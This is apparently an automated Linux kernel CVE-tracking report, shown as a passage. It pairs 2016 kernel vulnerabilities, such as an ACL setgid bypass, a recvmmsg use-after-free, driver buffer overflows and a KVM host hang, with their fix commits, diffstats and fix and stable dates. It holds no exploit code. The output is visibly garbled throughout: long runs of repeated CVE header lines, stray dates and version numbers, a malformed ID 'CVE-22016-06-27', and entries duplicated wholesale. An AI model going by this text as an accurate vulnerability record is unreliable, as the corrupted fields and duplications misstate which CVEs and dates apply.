    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5412:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 93d17397e4e2182fdaad503e2f9da46202c0f1c3
Author: Paul Mackerras <paulus@ozlabs.org>
Date:   Wed Jun 22 15:52:55 2016 +1000

    KVM: PPC: Book3S HV: Save/restore TM state in H_CEDE
    
    It turns out that if the guest does a H_CEDE while the CPU is in
    a transactional state, and the H_CEDE does a nap, and the nap
    loses the architected state of the CPU (which is is allowed to do),
    then we lose the checkpointed state of the virtual CPU.  In addition,
    the transactional-memory state recorded in the MSR gets reset back
    to non-transactional, and when we try to return to the guest, we take
    a TM bad thing type of program interrupt because we are trying to
    transition from non-transactional to transactional with a hrfid
    instruction, which is not permitted.
    
    The result of the program interrupt occurring at that point is that
    the host CPU will hang in an infinite loop with interrupts disabled.
    Thus this is a denial of service vulnerability in the host which can
    be triggered by any guest (and depending on the guest kernel, it can
    potentially triggered by unprivileged userspace in the guest).
    
    This vulnerability has been assigned the ID CVE-2016-5412.
    
    To fix this, we save the TM state before napping and restore it
    on exit from the nap, when handling a H_CEDE in real mode.  The
    case where H_CEDE exits to host virtual mode is already OK (as are
    other hcalls which exit to host virtual mode) because the exit
    path saves the TM state.
    
    Cc: stable@vger.kernel.org # v3.15+
    Signed-off-by: Paul Mackerras <paulus@ozlabs.org>

 arch/powerpc/kvm/book3s_hv_rmhandlers.S |   13 +++++++++++++
 1 file changed, 13 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-5412
Break Date: 2014-03-29
Break Commit: e4e38121507a27d2ccc4b28d9e7fc4818a12c44c
Break Tag: 3.15
Linus Fix Date: 2016-07-28
Linus Commit: 93d17397e4e2182fdaad503e2f9da46202c0f1c3
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-5412:
CVE-2016-5412:
3.15:
CVE-2016-5412:
*************

*** This is a new CVE ***
---
